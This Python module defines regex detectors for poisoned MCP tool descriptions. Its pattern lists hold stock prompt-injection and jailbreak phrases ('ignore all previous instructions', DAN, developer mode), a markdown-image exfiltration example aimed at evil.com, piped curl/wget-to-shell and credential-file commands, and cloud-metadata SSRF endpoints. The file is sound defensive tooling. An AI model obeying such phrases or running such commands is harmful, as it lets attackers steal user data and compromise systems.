"""
MCP Tool Poisoning Attack Pattern Detectors

Detects 8 categories of tool description poisoning attacks:
1. Prompt Injection (incl. jailbreak patterns)
2. Data Exfiltration (incl. markdown image exfil)
3. Cross-Tool Manipulation
4. Invisible Characters
5. Obfuscated Payloads
6. Description Anomalies
7. Dangerous Commands
8. SSRF / Internal Access
"""

import re
import base64
import unicodedata
from dataclasses import dataclass, field
from typing import List, Callable


@dataclass
class DetectionResult:
    pattern_name: str
    severity: int
    matched: bool
    evidence: str
    description: str

    def to_dict(self):
        return {
            "pattern_name": self.pattern_name,
            "severity": self.severity,
            "matched": self.matched,
            "evidence": self.evidence,
            "description": self.description,
        }


@dataclass
class PatternDetector:
    name: str
    description: str
    severity: int
    detect: Callable


# --- Detector 1: Prompt Injection ---

PROMPT_INJECTION_PATTERNS = [
    r"ignore\s+all\s+previous\s+instructions",
    r"ignore\s+prior\s+instructions",
    r"disregard\s+all\s+previous",
    r"forget\s+all\s+previous",
    r"override\s+all\s+previous",
    r"you\s+must\s+always\s+execute",
    r"you\s+are\s+now\s+a\b",
    r"you\s+are\s+no\s+longer",
    r"system\s*prompt\s*:",
    r"new\s+instructions\s*:",
    r"<system>",
    r"\[INST\]",
    r"\[/INST\]",
    r"<<SYS>>",
    r"human:\n",
    r"assistant:\n",
    r"IMPORTANT:\s*always",
    r"CRITICAL:\s*you\s+must",
    r"do\s+not\s+tell\s+the\s+user",
    r"hide\s+this\s+from\s+the\s+user",
    r"\bsecretly\b",
    r"without\s+the\s+user\s+knowing",
    r"before\s+responding\s+to\s+the\s+user",
    r"after\s+every\s+response",
    # Jailbreak patterns (DAN, roleplay, persona hijacking)
    r"you\s+are\s+DAN\b",
    r"Do\s+Anything\s+Now",
    r"act\s+as\s+if\s+you\s+have\s+no\s+restrictions",
    r"pretend\s+you\s+(are|have)\s+(no|unrestricted)",
    r"enter\s+(developer|debug|god|admin)\s+mode",
    r"enable\s+(developer|debug|god|admin)\s+mode",
    r"jailbreak",
    r"bypass\s+(your|all|safety|content)\s+(filters?|restrictions?|guidelines?|rules?)",
    r"ignore\s+(your|all|safety|content)\s+(filters?|restrictions?|guidelines?|rules?)",
    r"from\s+now\s+on\s+you\s+(will|must|should|are)",
    r"respond\s+without\s+(any\s+)?(restrictions?|filters?|limitations?)",
]


def detect_prompt_injection(tool_name: str, description: str) -> DetectionResult:
    matched_patterns = []
    for pattern in PROMPT_INJECTION_PATTERNS:
        matches = re.findall(pattern, description, re.IGNORECASE)
        if matches:
            matched_patterns.extend(matches)

    if matched_patterns:
        return DetectionResult(
            pattern_name="Prompt Injection",
            severity=85,
            matched=True,
            evidence=f"Found {len(matched_patterns)} injection pattern(s): {', '.join(repr(m) for m in matched_patterns[:5])}",
            description="Hidden LLM instructions detected in tool description that attempt to override agent behavior.",
        )

    return DetectionResult(
        pattern_name="Prompt Injection",
        severity=85,
        matched=False,
        evidence="",
        description="No prompt injection patterns detected.",
    )


# --- Detector 2: Data Exfiltration ---

DATA_EXFIL_PHRASE_PATTERNS = [
    r"send\s+all\s+(data|context|conversation|history|messages?)",
    r"forward\s+all\s+(data|context|conversation|history|messages?)",
    r"transmit\s+all\s+(data|context|conversation|history|messages?)",
    r"post\s+all\s+data\s+to",
    r"upload\s+all\s+data\s+to",
    r"\bexfiltrat",
    r"leak\s+the\s+(data|secrets?|keys?|tokens?|credentials?)",
    r"include\s+all\s+(conversation|context|history)\s+in\s+the\s+(request|body|payload)",
    r"attach\s+all\s+(conversation|context|history)",
    r"\bwebhook\b",
    r"callback\s*url",
    r"report\s+back\s+to",
    r"phone\s+home",
    # Markdown image exfiltration (render an image URL with leaked data)
    r"!\[.*?\]\(https?://",
    r"render\s+(this|an?|the)\s+(image|img|markdown)",
    r"display\s+(this|an?|the)\s+(image|img|markdown)",
    r"include\s+(this|an?|the)\s+(image|img)\s+in\s+(your|the)\s+response",
    r"\?\w*=(data|token|key|secret|session|cookie|credential|password|chat|history|context)",
]

DATA_EXFIL_URL_PATTERN = r"https?://[^\s\"\'>]+"
MARKDOWN_IMAGE_EXFIL_PATTERN = r"!\[[^\]]*\]\(https?://[^\)]+\)"


def detect_data_exfiltration(tool_name: str, description: str) -> DetectionResult:
    phrase_matches = []
    for pattern in DATA_EXFIL_PHRASE_PATTERNS:
        matches = re.findall(pattern, description, re.IGNORECASE)
        if matches:
            phrase_matches.extend(matches)

    url_matches = re.findall(DATA_EXFIL_URL_PATTERN, description)

    # Markdown image exfiltration: ![alt](https://evil.com/?d=LEAKED_DATA)
    md_image_matches = re.findall(MARKDOWN_IMAGE_EXFIL_PATTERN, description)
    if md_image_matches:
        phrase_matches.append(f"markdown_image_exfil:{md_image_matches[0][:60]}")

    if phrase_matches:
        severity = 90
        evidence = f"Data exfiltration phrases found: {', '.join(repr(m) for m in phrase_matches[:5])}"
        if url_matches:
            evidence += f"; URLs: {', '.join(url_matches[:3])}"
        return DetectionResult(
            pattern_name="Data Exfiltration",
            severity=severity,
            matched=True,
            evidence=evidence,
            description="Tool description contains instructions to send data to external endpoints.",
        )
    elif url_matches:
        return DetectionResult(
            pattern_name="Data Exfiltration",
            severity=60,
            matched=True,
            evidence=f"External URLs found: {', '.join(url_matches[:3])}",
            description="Tool description contains external URLs that could be used for data exfiltration.",
        )

    return DetectionResult(
        pattern_name="Data Exfiltration",
        severity=90,
        matched=False,
        evidence="",
        description="No data exfiltration patterns detected.",
    )


# --- Detector 3: Cross-Tool Manipulation ---

CROSS_TOOL_PATTERNS = [
    r"(before|after)\s+(using|calling|running|executing)\s+(this|any|another)\s+tool",
    r"(first|always)\s+(call|use|run|execute|invoke)",
    r"must\s+(call|use|run|execute|invoke)\s+\w+\s+(tool|function|method)",
    r"chain\s+with",
    r"pipe\s+(output|result)\s+to",
    r"redirect\s+(output|result)\s+to",
    r"depends\s+on\s+calling",
    r"requires\s+(calling|executing|running)",
    r"trigger\s+the\s+\w+\s+(tool|function|endpoint)",
    r"also\s+(call|invoke|trigger|run)",
]


def detect_cross_tool_manipulation(tool_name: str, description: str) -> DetectionResult:
    matched_patterns = []
    for pattern in CROSS_TOOL_PATTERNS:
        matches = re.findall(pattern, description, re.IGNORECASE)
        if matches:
            matched_patterns.extend(
                [m if isinstance(m, str) else " ".join(m) for m in matches]
            )

    if matched_patterns:
        return DetectionResult(
            pattern_name="Cross-Tool Manipulation",
            severity=75,
            matched=True,
            evidence=f"Cross-tool manipulation patterns: {', '.join(repr(m) for m in matched_patterns[:5])}",
            description="Tool description attempts to manipulate the agent into calling other tools unexpectedly.",
        )

    return DetectionResult(
        pattern_name="Cross-Tool Manipulation",
        severity=75,
        matched=False,
        evidence="",
        description="No cross-tool manipulation patterns detected.",
    )


# --- Detector 4: Invisible Characters ---

SUSPICIOUS_CODEPOINTS = {
    0x200B,  # Zero Width Space
    0x200C,  # Zero Width Non-Joiner
    0x200D,  # Zero Width Joiner
    0x200E,  # Left-to-Right Mark
    0x200F,  # Right-to-Left Mark
    0x202A,  # Left-to-Right Embedding
    0x202B,  # Right-to-Left Embedding
    0x202C,  # Pop Directional Formatting
    0x202D,  # Left-to-Right Override
    0x202E,  # Right-to-Left Override
    0x2060,  # Word Joiner
    0x2061,  # Function Application
    0x2062,  # Invisible Times
    0x2063,  # Invisible Separator
    0x2064,  # Invisible Plus
    0xFEFF,  # Zero Width No-Break Space (BOM)
    0xFFF9,  # Interlinear Annotation Anchor
    0xFFFA,  # Interlinear Annotation Separator
    0xFFFB,  # Interlinear Annotation Terminator
}

SUSPICIOUS_CATEGORIES = {"Cf", "Co", "Cn"}


def detect_invisible_characters(tool_name: str, description: str) -> DetectionResult:
    suspicious_chars = []

    for i, char in enumerate(description):
        cp = ord(char)
        if cp in SUSPICIOUS_CODEPOINTS:
            name = unicodedata.name(char, f"U+{cp:04X}")
            suspicious_chars.append(f"'{name}' (U+{cp:04X}) at position {i}")
        elif cp > 127:
            category = unicodedata.category(char)
            if category in SUSPICIOUS_CATEGORIES:
                name = unicodedata.name(char, f"U+{cp:04X}")
                suspicious_chars.append(
                    f"'{name}' (U+{cp:04X}, category {category}) at position {i}"
                )

    if suspicious_chars:
        return DetectionResult(
            pattern_name="Invisible Characters",
            severity=80,
            matched=True,
            evidence=f"Found {len(suspicious_chars)} suspicious character(s): {'; '.join(suspicious_chars[:5])}",
            description="Tool description contains invisible or suspicious Unicode characters that could hide malicious content.",
        )

    return DetectionResult(
        pattern_name="Invisible Characters",
        severity=80,
        matched=False,
        evidence="",
        description="No invisible or suspicious characters detected.",
    )


# --- Detector 5: Obfuscated Payloads ---

BASE64_PATTERN = r"[A-Za-z0-9+/]{20,}={0,2}"
HEX_PATTERN = r"(?:0x[0-9a-fA-F]{2}\s*){4,}"
UNICODE_ESCAPE_PATTERN = r"\\u[0-9a-fA-F]{4}"
HTML_ENTITY_PATTERN = r"&#x[0-9a-fA-F]+;"


def detect_obfuscated_payloads(tool_name: str, description: str) -> DetectionResult:
    evidence_parts = []

    # Base64 detection
    b64_matches = re.findall(BASE64_PATTERN, description)
    for match in b64_matches:
        try:
            decoded = base64.b64decode(match).decode("utf-8", errors="ignore")
            if len(decoded) > 5 and decoded.isprintable():
                evidence_parts.append(
                    f"Base64 string decodes to readable content: '{decoded[:50]}...'"
                )
        except Exception:
            pass

    # Hex sequences
    hex_matches = re.findall(HEX_PATTERN, description)
    if hex_matches:
        evidence_parts.append(
            f"Hex sequences found: {len(hex_matches)} occurrence(s)"
        )

    # Unicode escapes
    unicode_matches = re.findall(UNICODE_ESCAPE_PATTERN, description)
    if len(unicode_matches) > 3:
        evidence_parts.append(
            f"Excessive unicode escapes: {len(unicode_matches)} found"
        )

    # HTML entities
    html_matches = re.findall(HTML_ENTITY_PATTERN, description)
    if len(html_matches) > 3:
        evidence_parts.append(
            f"Excessive HTML entities: {len(html_matches)} found"
        )

    if evidence_parts:
        return DetectionResult(
            pattern_name="Obfuscated Payloads",
            severity=70,
            matched=True,
            evidence="; ".join(evidence_parts),
            description="Tool description contains obfuscated content that may hide malicious instructions.",
        )

    return DetectionResult(
        pattern_name="Obfuscated Payloads",
        severity=70,
        matched=False,
        evidence="",
        description="No obfuscated payloads detected.",
    )


# --- Detector 6: Description Anomalies ---


def detect_description_anomalies(tool_name: str, description: str) -> DetectionResult:
    anomalies = []

    if len(description) > 2000:
        anomalies.append(
            f"Description length ({len(description)} chars) exceeds 2000 char threshold"
        )

    html_comments = re.findall(r"<!--", description)
    if html_comments:
        anomalies.append(f"HTML comments found: {len(html_comments)} occurrence(s)")

    consecutive_newlines = re.findall(r"\n{10,}", description)
    if consecutive_newlines:
        anomalies.append(
            f"Excessive consecutive newlines: {len(consecutive_newlines)} block(s)"
        )

    if len(tool_name) > 0:
        ratio = len(description) / len(tool_name)
        if ratio > 200:
            anomalies.append(
                f"Description/name length ratio ({ratio:.0f}) exceeds 200"
            )

    if anomalies:
        return DetectionResult(
            pattern_name="Description Anomalies",
            severity=45,
            matched=True,
            evidence="; ".join(anomalies),
            description="Tool description has structural anomalies that may indicate an attack.",
        )

    return DetectionResult(
        pattern_name="Description Anomalies",
        severity=45,
        matched=False,
        evidence="",
        description="No description anomalies detected.",
    )


# --- Detector 7: Dangerous Commands ---

DANGEROUS_COMMAND_PATTERNS = [
    r"\brm\s+-rf\b",
    r"\bcurl\s+.*\|\s*sh\b",
    r"\bwget\s+.*\|\s*sh\b",
    r"\beval\s*\(",
    r"\bexec\s*\(",
    r"\bos\.system\b",
    r"\bsubprocess\b",
    r"\b__import__\b",
    r"\bchmod\s+777\b",
    r"\bsudo\s+",
    r"\b/etc/passwd\b",
    r"\b/etc/shadow\b",
    r"\benv\s+var",
    r"\bAPI_KEY\b",
    r"\bSECRET_KEY\b",
    r"\bACCESS_TOKEN\b",
    r"\bPASSWORD\b",
    r"\bCREDENTIAL\b",
]


def detect_dangerous_commands(tool_name: str, description: str) -> DetectionResult:
    matched_patterns = []
    for pattern in DANGEROUS_COMMAND_PATTERNS:
        matches = re.findall(pattern, description, re.IGNORECASE)
        if matches:
            matched_patterns.extend(matches)

    if matched_patterns:
        return DetectionResult(
            pattern_name="Dangerous Commands",
            severity=80,
            matched=True,
            evidence=f"Dangerous patterns found: {', '.join(repr(m) for m in matched_patterns[:5])}",
            description="Tool description references dangerous system commands or sensitive credentials.",
        )

    return DetectionResult(
        pattern_name="Dangerous Commands",
        severity=80,
        matched=False,
        evidence="",
        description="No dangerous commands detected.",
    )


# --- Detector 8: SSRF / Internal Access ---

SSRF_PATTERNS = [
    # Cloud metadata endpoints
    r"169\.254\.169\.254",
    r"metadata\.google\.internal",
    r"metadata\.azure\.com",
    r"100\.100\.100\.200",  # Alibaba Cloud metadata
    # Localhost / loopback
    r"https?://localhost[:/]",
    r"https?://127\.0\.0\.1",
    r"https?://0\.0\.0\.0",
    r"https?://\[::1\]",
    # Private IP ranges
    r"https?://10\.\d{1,3}\.\d{1,3}\.\d{1,3}",
    r"https?://172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}",
    r"https?://192\.168\.\d{1,3}\.\d{1,3}",
    # Internal service patterns
    r"(visit|browse|fetch|access|request|open|navigate\s+to)\s+https?://(localhost|127\.0\.0\.1|10\.|172\.(1[6-9]|2\d|3[01])|192\.168|169\.254)",
    r"\b(internal|admin|management)\s+(api|endpoint|service|server|panel|console)\b",
    # Cloud provider internal services
    r"/latest/meta-data",
    r"/latest/api/token",
    r"\.internal(\.|\b)",
]


def detect_ssrf(tool_name: str, description: str) -> DetectionResult:
    matched_patterns = []
    for pattern in SSRF_PATTERNS:
        matches = re.findall(pattern, description, re.IGNORECASE)
        if matches:
            matched_patterns.extend(
                [m if isinstance(m, str) else " ".join(m) for m in matches]
            )

    if matched_patterns:
        return DetectionResult(
            pattern_name="SSRF / Internal Access",
            severity=85,
            matched=True,
            evidence=f"SSRF patterns found: {', '.join(repr(m) for m in matched_patterns[:5])}",
            description="Tool description references internal networks, cloud metadata endpoints, or localhost — potential SSRF via AI browsing.",
        )

    return DetectionResult(
        pattern_name="SSRF / Internal Access",
        severity=85,
        matched=False,
        evidence="",
        description="No SSRF or internal access patterns detected.",
    )


# --- All Detectors ---

ALL_DETECTORS: List[PatternDetector] = [
    PatternDetector("Prompt Injection", "Detects hidden LLM instructions in tool descriptions", 85, detect_prompt_injection),
    PatternDetector("Data Exfiltration", "Detects data exfiltration attempts via external endpoints", 90, detect_data_exfiltration),
    PatternDetector("Cross-Tool Manipulation", "Detects attempts to manipulate tool call chains", 75, detect_cross_tool_manipulation),
    PatternDetector("Invisible Characters", "Detects invisible Unicode characters hiding content", 80, detect_invisible_characters),
    PatternDetector("Obfuscated Payloads", "Detects base64, hex, and other obfuscated content", 70, detect_obfuscated_payloads),
    PatternDetector("Description Anomalies", "Detects structural anomalies in descriptions", 45, detect_description_anomalies),
    PatternDetector("Dangerous Commands", "Detects dangerous system commands and credential references", 80, detect_dangerous_commands),
    PatternDetector("SSRF / Internal Access", "Detects SSRF attempts via internal IPs, cloud metadata, and localhost", 85, detect_ssrf),
]
